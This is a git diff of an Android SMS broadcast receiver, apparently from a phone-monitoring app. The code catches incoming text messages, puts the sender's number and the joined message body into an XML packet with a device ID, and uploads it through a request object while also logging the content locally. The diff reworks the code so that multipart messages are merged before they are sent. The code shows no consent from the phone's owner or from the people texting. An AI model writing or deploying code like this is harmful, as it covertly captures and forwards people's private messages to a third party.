@@ -21,7 +21,6 @@ import com.inet.android.bs.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMS";
-	private static final Uri STATUS_URI = Uri.parse("content://sms");
 	private SmsSentObserver smsSentObserver = null;
 	String str = "";
 	SharedPreferences sp;
@@ -58,13 +57,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			mBundle = intent.getExtras();
 			// smsSentObserver = null;
 			Log.d(TAG, "Intent Action : " + intent.getAction());
-			Object[] pdus = (Object[]) mBundle.get("pdus");
-			if (pdus != null) {
-				getSMSDetails();
-			} else {
-				Log.e(TAG, "Bundle is Empty!");
-				FileLog.writeLog("sms: Bundle is Empty!");
-			}
+			getSMSDetails();
 
 			if (smsSentObserver == null) {
 				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
@@ -78,32 +71,19 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	}
 
 	@SuppressLint("SimpleDateFormat")
-	@SuppressWarnings("deprecation")
 	private void getSMSDetails() {
 		SmsMessage[] msgs = null;
-		dir = "вх. Sms";
+
 		try {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
+				dir = "вх. Sms";
 				msgs = new SmsMessage[pdus.length];
 
-				Log.d(TAG, "pdus length : " + pdus.length);
-				FileLog.writeLog("sms: pdus length : " + pdus.length);
-
-				SmsMessage messages = SmsMessage
-						.createFromPdu((byte[]) pdus[0]);
-				str += String.format("SMS from %s:%s\n", messages
-						.getOriginatingAddress(), messages.getMessageBody()
-						.toString());
-
-				Log.d("sms", str + logTime());
-				FileLog.writeLog("sms: " + str + logTime());
-
-				// Toast toast = Toast.makeText(mContext, str + logTime(),
-				// Toast.LENGTH_SHORT);
-				// toast.show();
+				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
 					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);
+
 					Log.d(TAG,
 							"getDisplayMessageBody : "
 									+ msgs[k].getDisplayMessageBody());
@@ -114,25 +94,25 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					Log.d(TAG,
 							"getOriginatingAddress : "
 									+ msgs[k].getOriginatingAddress());
-					Log.d(TAG,
-							"getProtocolIdentifier : "
-									+ msgs[k].getProtocolIdentifier());
-					Log.d(TAG, "getStatus : " + msgs[k].getStatus());
-					Log.d(TAG, "getStatusOnIcc : " + msgs[k].getStatusOnIcc());
-					Log.d(TAG, "getStatusOnSim : " + msgs[k].getStatusOnSim());
-					// -------send sms--------------------------------
-					String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-							+ "</id><time>" + logTime()
-							+ "</time><type>4</type><app>" + dir
-							+ "</app><ttl>" + msgs[k].getOriginatingAddress()
-							+ "</ttl><cdata1>" + msgs[k].getMessageBody()
-							+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
-
-					req = new Request(mContext);
-					req.sendRequest(sendStr);
-					Log.d("smsRec", sendStr);
-					FileLog.writeLog("sms: " + sendStr);
+				
 				}
+				String adress = msgs[0].getOriginatingAddress();
+
+				for (int i = 0; i < msgs.length; i++) {
+					bodyText.append(msgs[i].getMessageBody());
+				}
+				// -------send sms--------------------------------
+				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
+						+ "</id><time>" + logTime()
+						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
+						+ adress + "</ttl><cdata1>" + bodyText
+						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
+
+				req = new Request(mContext);
+				req.sendRequest(sendStr);
+				Log.d("smsRec", sendStr);
+				FileLog.writeLog("sms: " + sendStr);
+
 			}
 		} catch (Exception sfgh) {
 			Log.e(TAG, "Error in getSMSDetails : " + sfgh.toString());
